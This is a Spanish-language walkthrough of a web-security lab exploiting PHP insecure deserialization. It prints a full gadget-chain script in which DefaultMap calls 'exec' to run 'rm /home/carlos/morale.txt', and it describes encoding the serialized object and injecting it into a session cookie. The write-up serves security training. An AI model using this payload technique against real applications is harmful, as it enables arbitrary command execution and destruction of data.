Creamos manualmente un objeto **CustomTemplate** que contiene la cadena de gadgets necesaria. En este objeto, el atributo ‘**desc**‘ contiene una instancia de **DefaultMap** cuyo **callback** es la función **exec**. Al deserializarlo, ‘**exec()**‘ se invocará con el valor de ‘**default_desc_type**‘, que contiene nuestro comando malicioso.

Codificamos el objeto en Base64 y lo URL-encodeamos, luego lo inyectamos en la cookie de sesión. Al procesarse, se ejecuta el comando, lo que elimina el archivo ‘**morale.txt**‘ del directorio de Carlos y resuelve el laboratorio.

Solucion
![Pasted_image_20250827015606.png](/Imagenes/Pasted_image_20250827015606.png)
asi que modificamos el codigo
(<?php

class CustomTemplate {
    public $default_desc_type;
    public $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    public function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    public $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

$obj = new CustomTemplate();
$obj->desc = new DefaultMap("exec");
$obj->default_desc_type = "rm /home/carlos/morale.txt";

echo serialize($obj);
?>)
Ambos códigos comparten la misma estructura de clases (`CustomTemplate`, `Product`, `Description`, `DefaultMap`), pero tienen diferencias **críticas** en cuanto a seguridad, visibilidad y comportamiento al serializar. Vamos a desglosarlo:

🧩 Comparación técnica entre los dos códigos

![Pasted_image_20250827021726.png](/Imagenes/Pasted_image_20250827021726.png)

🔥 ¿Por qué el segundo código es peligroso?

En el segundo código, se hace esto:

$obj->desc = new DefaultMap("exec"); $obj->default_desc_type = "rm /home/carlos/morale.txt";

Y luego se serializa el objeto:

echo serialize($obj);

Cuando este objeto se deserializa, se ejecuta:

$this->product = new Product($this->default_desc_type, $this->desc);

Lo que se traduce en:

$this->desc = $desc->$default_desc_type;

Y como `$desc` es un `DefaultMap`, se invoca:

call_user_func("exec", "rm /home/carlos/morale.txt");

💣 **Resultado**: Se ejecuta un comando del sistema que borra un archivo.

🛡️ Conclusión

- El **primer código** es seguro y bien encapsulado. No permite manipulación externa de propiedades sensibles.
- El **segundo código** es vulnerable a **deserialización insegura**, lo que puede permitir ejecución de comandos arbitrarios si el objeto es manipulado antes de serializar.
ejecutamos
![Pasted_image_20250827021815.png](/Imagenes/Pasted_image_20250827021815.png)
asi que esto hay que representarlo en base64
![Pasted_image_20250827022115.png](/Imagenes/Pasted_image_20250827022115.png)
copiamos la cookie y pegamos
![Pasted_image_20250827022202.png](/Imagenes/Pasted_image_20250827022202.png)
